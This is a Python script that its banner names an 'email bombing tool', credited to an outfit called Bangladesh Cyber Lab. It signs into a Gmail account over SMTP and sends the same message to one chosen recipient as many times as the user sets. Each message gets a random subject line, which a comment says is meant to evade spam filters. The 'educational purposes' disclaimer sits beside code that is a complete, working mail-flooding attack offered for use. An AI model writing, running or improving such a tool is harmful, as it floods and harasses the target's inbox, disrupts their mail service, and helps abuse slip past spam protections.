#!/usr/bin/env python3
import os
import smtplib
import getpass
import sys
import time

def banner():
    print(r"""

    ╔═════════════════════════════════════════════════════════════════╗
    ║                                                                 ║
    ║    ██████╗ ██╗   ██╗██╗     ██╗     ███████╗████████╗           ║
    ║    ██╔══██╗██║   ██║██║     ██║     ██╔════╝╚══██╔══╝           ║
    ║    ██████╔╝██║   ██║██║     ██║     █████╗     ██║              ║
    ║    ██╔══██╗██║   ██║██║     ██║     ██╔══╝     ██║              ║
    ║    ██████╔╝╚██████╔╝███████╗███████╗███████╗   ██║              ║
    ║    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚══════╝   ╚═╝              ║
    ║                                                                 ║
    ║                    EMAIL BOMBING TOOL                           ║
    ║                                                                 ║
    ║    ORGANIZATION  : BANGLADESH CYBER LAB                         ║ 
    ║    CEO           : SURAJIT MONDAL                               ║ 
    ║    VERSION       : 3.0                                          ║
    ║    Coding by     : Surajit Mondal                               ║
    ║                                                                 ║
    ║       THIS TOOL IS DEVELOPED FOR EDUCATIONAL PURPOSES           ║
    ║   ETHICAL HACKING, CYBERSECURITY AWARENESS, AND AUTHORIZED      ║
    ║                  SECURITY RESEARCH.                             ║
    ╚═════════════════════════════════════════════════════════════════╝
   """)
banner()

try:
    email = input('Haker Gmail Address : ')
    user = input('Anonymous name : ')
    passwd = getpass.getpass('Password: ')

    to = input('\nTo: ')
    body = input('Message: ')
    total = int(input('Number of send: '))

    smtp_server = 'smtp.gmail.com'
    port = 587

    print('\n[+] Connecting to server...')
    server = smtplib.SMTP(smtp_server, port) 
    server.ehlo()
    server.starttls()
    
    print('[+] Logging in...')
    server.login(email, passwd)
    
    print('[+] Starting the attack...\n')
    for i in range(1, total + 1):
        # Generating a random subject to avoid spam filters
        subject = os.urandom(5).hex()
        msg = f'From: {user}\nSubject: {subject}\n\n{body}'
        
        server.sendmail(email, to, msg)
        sys.stdout.write(f"\rE-mails sent: {i}")
        sys.stdout.flush()
        time.sleep(1)
        
    server.quit()
    print('\n\n[+] Done !!!')

except KeyboardInterrupt:
    print('\n[-] Canceled by user')
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print('\n[!] Error: The username or password you entered is incorrect.')
    print('[!] Or you need to use an "App Password" if 2FA is enabled.')
except Exception as e:
    print(f'\n[!] An error occurred: {e}')

sys.exit()
